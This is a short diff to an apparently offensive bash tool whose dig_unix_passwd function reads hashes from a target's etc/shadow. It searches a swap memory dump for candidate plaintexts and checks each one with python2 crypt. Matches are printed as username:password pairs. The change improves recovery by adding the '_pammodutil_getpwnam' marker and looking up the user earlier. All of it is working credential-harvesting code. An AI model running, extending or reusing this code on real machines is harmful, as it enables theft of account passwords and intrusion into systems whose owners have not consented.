@@ -97,8 +97,10 @@ function dig_unix_passwd () {
     out " [+] Digging linux accounts credentials... (pattern attack)"
     SHADOWHASHES="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | grep -E '^\$.\$')"
     while read -r thishash; do
-        [ $VERBOSE ] && out "   [-] Digging for hash: $thishash ..."
-        DUMP=`grep -C50 "$thishash" "$swap_dump_path"`
+        USER="$(grep "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
+        [ $VERBOSE ] && out "   [-] Digging for hash: $thishash  ($USER) ..."
+        DUMP=`grep -C40 -E "$thishash|_pammodutil_getpwnam" "$swap_dump_path"`
+        # Add _pammodutil_getpwnam
         CTYPE="$(echo "$thishash" | cut -c-3)"
         SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
         while read -r line; do
@@ -107,7 +109,6 @@ function dig_unix_passwd () {
             CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
             if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
                 #Find which user's password it is (useful if used more than once!)
-                USER="$(grep "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
                 out "   -> $USER:$line"
                 passwordList=("${passwordList[@]}" "$line")
                 break
